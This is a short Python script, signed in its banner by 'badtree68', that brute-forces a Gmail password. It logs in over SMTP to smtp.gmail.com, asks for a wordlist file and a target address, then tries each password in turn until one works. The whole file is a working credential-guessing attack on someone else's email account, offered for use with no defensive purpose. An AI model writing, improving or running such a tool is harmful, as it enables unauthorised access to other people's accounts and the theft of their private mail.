import smtplib
from colorama import Fore,init
init()
bruteforce=smtplib.SMTP("smtp.gmail.com",587)
# 587 or 465
print(                                                 f"{Fore.RED}     programmer:badtree68        ") 
bruteforce.ehlo()
bruteforce.starttls()
passlist=input("enter a your passlist: ")
target=input("enter target 's gmail: ")
readfile=open(passlist, "r")
for passwords in readfile:
    try:
        bruteforce.login(target,passwords)
        print(f"{Fore.GREEN}[+] password found !{passwords}")
        break
    except:
        print(f"{Fore.GREEN}[-] pssword false : {passwords}  ")

